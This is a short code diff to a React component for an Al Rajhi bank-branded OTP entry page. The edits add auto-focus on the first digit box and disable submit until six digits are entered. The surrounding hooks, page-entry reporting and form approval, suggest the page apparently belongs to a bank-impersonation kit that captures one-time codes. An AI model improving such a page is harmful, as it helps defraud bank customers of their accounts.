@@ -21,9 +21,16 @@ export default function AlRajhiOTP() {
   const [error, setError] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
 
-  // Emit page enter
+  // Emit page enter and focus on first input
   useEffect(() => {
     navigateToPage("الراجحى (OTP)");
+    // التركيز على أول خانة إدخال
+    setTimeout(() => {
+      const firstInput = document.querySelector('[data-input-otp-slot="0"]') as HTMLInputElement;
+      if (firstInput) {
+        firstInput.focus();
+      }
+    }, 100);
   }, []);
 
   // Handle form approval
@@ -114,7 +121,12 @@ export default function AlRajhiOTP() {
           )}
 
           {/* Submit Button */}
-          <Button type="submit" className="w-full bg-[#004d7a] hover:bg-[#003d5c]" size="lg">
+          <Button 
+            type="submit" 
+            className="w-full bg-[#004d7a] hover:bg-[#003d5c]" 
+            size="lg"
+            disabled={otp.length !== 6}
+          >
             تأكيد
           </Button>
 
